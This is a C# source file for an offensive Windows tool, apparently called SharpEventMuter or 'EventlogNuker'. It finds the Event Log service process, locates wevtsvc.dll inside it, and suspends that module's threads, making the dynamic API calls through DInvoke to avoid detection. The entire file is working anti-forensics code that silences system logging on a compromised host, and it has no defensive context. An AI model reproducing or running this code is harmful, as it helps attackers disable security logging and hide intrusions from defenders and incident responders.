using System;
using System.Text;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using DInvoke.DynamicInvoke;
using Native = DInvoke.Data.Native;

namespace SharpEventMuter
{
    class Program
    {
        [DllImport("psapi.dll")]
        private static extern uint GetModuleBaseName(IntPtr hWnd, IntPtr hModule, StringBuilder lpFileName, int nSize);

        [DllImport("kernel32.dll")]
        static extern bool Thread32Next(IntPtr hSnapshot, ref STRUCTS.THREADENTRY32 lpte);


        public static void printBanner()
        {
            Console.WriteLine(@"
              /\                       |\**/|      
             /  \                      \ == /
             |  |                       |  |
             |  |     EventlogNuker     |  |
            / == \       @jfmaes        \  /
            |/**\|                       \/

");
            Console.WriteLine();
        }

        public static void successASCII()
        {
            Console.WriteLine(@"

                  _.-^^---....,,--       
             _--                  --_  
            <                        >)
            |                         | 
             \._                   _./  
               ```--. . , ; .--'''       
                     | |   |             
                  .-=||  | |=-.   
                  `-=#$%&%$#=-'   
                     | ;  :|     
            _____.,-#%&$@%#&#~,._____

        Eventlog nuked successfully!

");
            Console.WriteLine();
        }
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static int GetEventLogPid()
        {
            int pid = 0;
            ManagementObjectSearcher mgmtObjSearcher = new ManagementObjectSearcher("SELECT ProcessId FROM Win32_service WHERE name = \'eventlog\'");
            ManagementObjectCollection eventlogCollectors = mgmtObjSearcher.Get();
            //long live IEnumerables...
            if (eventlogCollectors.Count != 1)
            {
                throw new Exception("there should only be one eventlog collector on the system");
            }
            foreach (ManagementObject eventlogcollector in eventlogCollectors)
            {
                object o = eventlogcollector["ProcessId"];
                pid = Convert.ToInt32(o);
                //pid = Convert.ToUInt32((uint)eventlogcollector["ProcessId"]);
            }
            Console.WriteLine("target found, nuke launched on the eventlog threads of PID: " + pid);
            return pid;
        }

        public static bool NukeEventLog(int pid)
        {
            bool nuked = false;
            IntPtr[] modules = new IntPtr[256];
            uint moduleSize = (uint)(Marshal.SizeOf(typeof(IntPtr)) * (modules.Length));
            uint moduleSizeNeeded = 0;
            int modulesCount = 0;
            STRUCTS.THREADENTRY32 threadEntry = new STRUCTS.THREADENTRY32();
            threadEntry.dwSize = (uint)Marshal.SizeOf(threadEntry);
            StringBuilder baseModuleName = new StringBuilder(1024);
            GCHandle gch = GCHandle.Alloc(modules, GCHandleType.Pinned); // Don't forget to free this later
            IntPtr pModules = gch.AddrOfPinnedObject();
            IntPtr serviceModule = IntPtr.Zero;
            IntPtr threadHandle = IntPtr.Zero;
            IntPtr threadStartAddress = IntPtr.Zero;
            STRUCTS.MODULEINFO serviceModuleInfo = new STRUCTS.MODULEINFO();
            IntPtr serviceModuleInfoPtr = Marshal.AllocHGlobal(Marshal.SizeOf(serviceModuleInfo));
            Marshal.StructureToPtr(serviceModuleInfo, serviceModuleInfoPtr, false);
            STRUCTS.THREAD_BASIC_INFORMATION threadBasicInformation = new STRUCTS.THREAD_BASIC_INFORMATION();

            Object[] openProcessParams = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.MAXIMUM_ALLOWED, false, (uint)pid };
            IntPtr serviceProcessHandle = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(Win32.Delegates.OpenProcess), ref openProcessParams);
            if (serviceProcessHandle == IntPtr.Zero)
            {
                throw new Exception("handle could not be opened for pid" + pid);
            }
            object[] createToolhelp32Params = { STRUCTS.SnapshotFlags.Thread, (uint)0 };
            IntPtr snapshotHandle = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "CreateToolhelp32Snapshot", typeof(DELEGATES.CreateToolhelp32Snapshot), ref createToolhelp32Params);
            if (snapshotHandle == IntPtr.Zero)
            {
                throw new Exception("snapshot could not be made.");
            }
            /* https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules#requirements */
            object[] enumProcessModulesParams = { serviceProcessHandle, pModules, moduleSize, moduleSizeNeeded };
            bool success = (bool)Generic.DynamicAPIInvoke("psapi.dll", "EnumProcessModules", typeof(DELEGATES.EnumProcessModules), ref enumProcessModulesParams, true);
            pModules = (IntPtr)enumProcessModulesParams[1];
            moduleSizeNeeded = (uint)enumProcessModulesParams[3];
            if (!success)
            {
                throw new Exception("modules could not be enumerated");
            }

            modulesCount = (Int32)(moduleSizeNeeded / (Marshal.SizeOf(typeof(IntPtr))));
            for (int i = 0; i < modulesCount; i++)
            {
                serviceModule = modules[i];
                //  Object[] getModBaseNameParams = { serviceProcessHandle, serviceModule, baseModuleName, baseModuleName.Capacity };
                //Generic.DynamicAPIInvoke("psapi.dll", "GetModuleBaseNameA", typeof(DELEGATES.GetModuleBaseName), ref enumProcessModulesParams, true);
                //baseModuleName = (StringBuilder)getModBaseNameParams[2];
                GetModuleBaseName(serviceProcessHandle, serviceModule, baseModuleName, baseModuleName.Capacity);
                if (baseModuleName.ToString() == "wevtsvc.dll")
                {
                    string addr = string.Format("0x{0:X}", serviceModule);
                    Console.WriteLine("{0} found at {1}", baseModuleName.ToString(), addr);



                    Object[] getModuleInformationParams = { serviceProcessHandle, serviceModule, serviceModuleInfoPtr, (uint)Marshal.SizeOf(serviceModuleInfo) };
                    Generic.DynamicAPIInvoke("psapi.dll", "GetModuleInformation", typeof(DELEGATES.GetModuleInformation), ref getModuleInformationParams, true);
                    serviceModuleInfoPtr = (IntPtr)getModuleInformationParams[2];
                    serviceModuleInfo = (STRUCTS.MODULEINFO)Marshal.PtrToStructure(serviceModuleInfoPtr, typeof(STRUCTS.MODULEINFO));
                }

            }

            Object[] thread32FirstParams = { snapshotHandle, threadEntry };
            Generic.DynamicAPIInvoke("kernel32.dll", "Thread32First", typeof(DELEGATES.Thread32First), ref thread32FirstParams, true);
            threadEntry = (STRUCTS.THREADENTRY32)thread32FirstParams[1];
            //Object[] thread32NextParams = { snapshotHandle, threadEntry };
            //threadEntry = (STRUCTS.THREADENTRY32)thread32NextParams[1];
            while (Thread32Next(snapshotHandle, ref threadEntry))
            {
                if (threadEntry.th32OwnerProcessID == pid)
                {
                    Object[] openThreadParams = { DInvoke.Data.Win32.Kernel32.ThreadAccess.MAXIMUM_ALLOWED, false, threadEntry.th32ThreadID };
                    threadHandle = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "OpenThread", typeof(DELEGATES.OpenThread), ref openThreadParams, true);
                    Object[] ntQueryInformationParams = { threadHandle, STRUCTS.ThreadInfoClass.ThreadQuerySetWin32StartAddress, threadStartAddress, (uint)Marshal.SizeOf(threadStartAddress), IntPtr.Zero };
                    Native.NTSTATUS status = (Native.NTSTATUS)Generic.DynamicAPIInvoke("ntdll.dll", "NtQueryInformationThread", typeof(DELEGATES.NtQueryInformationThread), ref ntQueryInformationParams, true);
                    threadStartAddress = (IntPtr)ntQueryInformationParams[2];
                    if (threadStartAddress.ToInt64() >= serviceModuleInfo.lpBaseOfDll.ToInt64() && threadStartAddress.ToInt64() <= serviceModuleInfo.lpBaseOfDll.ToInt64() + serviceModuleInfo.sizeOfImage)
                    {

                        Console.WriteLine("suspending eventlog thread {0}", threadEntry.th32ThreadID);
                        Object[] suspendParams = { threadHandle };
                        Generic.DynamicAPIInvoke("kernel32.dll", "SuspendThread", typeof(DELEGATES.SuspendThread), ref suspendParams, true);
                    }

                    nuked = true;
                }
                //threadEntry = (STRUCTS.THREADENTRY32)thread32NextParams[1];

            }

            gch.Free();
            Marshal.FreeHGlobal(serviceModuleInfoPtr);
            return nuked;
        }

        static void Main(string[] args)
        {
            try
            {
                printBanner();
                if (!IsAdministrator())
                {
                    Console.WriteLine("you can only kill eventlog when you are admin bruh.");
                }

                if (NukeEventLog(GetEventLogPid()))
                {
                    successASCII();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }
    }
}
